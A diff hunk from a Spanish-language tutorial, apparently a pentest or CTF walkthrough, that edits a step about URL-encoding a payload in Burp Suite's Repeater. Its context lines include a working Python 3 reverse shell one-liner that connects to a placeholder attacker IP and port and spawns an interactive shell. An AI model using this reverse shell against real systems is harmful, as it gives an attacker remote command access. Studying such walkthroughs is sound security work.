@@ -282,7 +282,7 @@ En este caso, el comando es una reverse shell de Python 3.
 
     python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",<PUERTO_ATACANTE>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
-**Importante:** Modificar "IP_ATACANTE" y "PUERTO_ATACANTE" por la dirección IP y el puerto del atacante respectivamente. Seleccionamos el texto y presionamos "Ctrl+U" para que se codifique en formato URL.
+**Importante:** Modificar "IP_ATACANTE" y "PUERTO_ATACANTE" por la dirección IP y el puerto del atacante respectivamente. Seleccionamos el texto y presionamos "Ctrl+U" en el Repeater de Burp Suite para que se codifique en formato URL.
 
 Y el payload que vamos a utilizar es el siguiente:
 
